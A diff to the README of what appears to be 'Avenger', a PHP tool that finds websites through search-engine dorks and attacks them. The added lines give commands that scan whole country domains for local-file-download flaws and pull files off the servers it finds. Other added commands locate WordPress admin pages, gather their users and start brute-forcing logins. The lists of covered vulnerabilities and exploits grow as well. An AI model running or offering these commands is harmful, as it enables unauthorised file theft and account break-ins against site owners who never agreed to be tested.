@@ -64,10 +64,26 @@ php avenger sh --dork="site:com.ar inurl:download.php?file=" --check="lfd"
 #### Result of Local File Download
 ![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem7.png)
 
+### Check and Exploited Local File Download
+
+> This next command you will check vulnerabilities and extract files of server. The files will save in /results/exploits/lfd/
+ 
+```bash
+php avenger sh --dork="site:com.mx inurl:download.php?file=" --check="lfd" --exploit="lfd"
+```
+#### Result of Extract Files 
+![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/11/lfdFiles.png)
+#### Video of Extract Files 
+[![Video of extract files](https://img.youtube.com/vi/IdrpQ7KQlmU/0.jpg)](https://www.youtube.com/watch?v=IdrpQ7KQlmU)
 
 ### Check is Admin Page
 ```bash
 php avenger sh --dork="site:com.ar inurl:admin" --check="isAdmin"
+```
+
+### Check is Admin Page and if Admin Page for WordPress get all users and start brute force 
+```bash
+php avenger sh --dork="site:com inurl:wp-content/uploads" --check="isAdmin" --exploit="btwp"
 ```
 
 ### Help for commands
@@ -86,13 +102,17 @@ php avenger sh
 * Yandex
 
 #### Covered Vulnerabilities
-* Sql Injection
-* Local File Download
+* Sql Injection (SQLI)
+* Local File Download (LFD)
 * Admin Page
+* Remote File Inclusion (RFI)
+* Cross-Site-Scripting (XSS)
+
+#### Covered Exploits
+* Local File Download (LFD)
+* Brute Force for WordPress
 
 #### Covered Vulnerabilities in next versions
-* RFI
-* Xss
 * Sensitive Files
     * Dump Files
     * Config Files
@@ -110,6 +130,6 @@ php avenger sh
 ## Help and docs
 * [Documentation](http://phpavenger.aszone.com.br).
 * [Examples](http://phpavenger.aszone.com.br/examples).
-* [Videos](http://youtube.com/aszone).
+* [Videos](https://www.youtube.com/user/MrLenonleite).
 * [Steakoverflow](http://phpavenger.aszone.com.br).
 
